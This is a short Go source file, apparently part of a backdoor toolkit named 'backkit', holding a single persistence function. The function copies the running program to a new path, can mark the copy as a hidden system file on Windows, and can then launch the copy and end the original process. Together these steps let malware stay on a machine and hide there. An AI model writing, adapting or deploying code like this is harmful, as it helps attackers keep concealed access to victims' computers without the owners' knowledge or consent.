package persistence

import (
	"os"
	"syscall"

	"github.com/iIIusi0n/backkit/utils"
)

func CopyForPersistence(path string, change, hide bool) error {
	currentPath, err := utils.GetCurrentPath()
	if err != nil {
		return err
	}
	err = utils.CopyFile(currentPath, path)
	if err != nil {
		return err
	}
	if hide {
		wideCharPath, err := syscall.UTF16PtrFromString(path)
		if err != nil {
			return err
		}
		err = syscall.SetFileAttributes(wideCharPath, syscall.FILE_ATTRIBUTE_HIDDEN|syscall.FILE_ATTRIBUTE_SYSTEM)
		if err != nil {
			return err
		}
	}
	if change {
		err := utils.RunExecutable(path, true)
		if err != nil {
			return err
		}
		os.Exit(0)
	}
	return nil
}
